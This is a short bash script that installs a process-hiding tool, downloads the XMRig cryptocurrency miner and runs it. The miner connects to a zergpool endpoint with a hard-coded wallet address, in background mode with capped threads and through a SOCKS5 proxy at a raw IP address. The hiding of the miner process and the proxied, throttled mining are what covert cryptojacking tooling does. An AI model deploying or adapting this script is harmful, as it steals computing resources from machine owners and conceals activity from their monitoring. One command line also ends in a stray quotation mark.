#!/bin/bash
sudo apt update 
sudo apt upgrade -y
sudo apt-get install nodejs-dev node-gyp libssl1.0-dev
sudo apt-get install npm
npm i -g node-process-hider
sudo ph add xmrig && wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz
tar -zxf xmrig-6.16.2-bionic-x64.tar.gz && cd xmrig-6.16.2 && chmod +x xmrig
./xmrig -o randomARQ.mine.zergpool.com:4464 -a rx/arq -k -u 19NGMAFwcdEPfYhW3FjsWMPF22m6WQi2b4 -p c=BTC,mc=GNTL --threads=2 -x socks5://192.252.214.20:15864"
exec bash
